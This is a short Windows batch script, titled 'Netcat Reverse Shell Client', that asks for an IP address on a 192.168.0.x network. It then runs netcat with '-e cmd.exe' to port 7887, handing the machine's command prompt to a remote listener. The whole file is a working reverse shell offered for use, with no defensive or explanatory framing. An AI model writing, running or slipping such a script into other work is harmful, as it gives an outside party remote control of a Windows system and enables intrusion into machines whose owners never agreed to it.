@echo off
title Netcat Reverse Shell Client
color 0a

set BASEIP=192.168.0.
set /p LASTOCTET=Enter the last octet of the Linux server [%BASEIP%XXX]: 
set FULLIP=%BASEIP%%LASTOCTET%

echo.
echo Connecting to %FULLIP% on port 7887 and spawning cmd.exe ...
echo.

:: This will connect to Linux and give control of cmd.exe
nc.exe %FULLIP% 7887 -e cmd.exe

echo.
echo Connection closed or failed.
pause
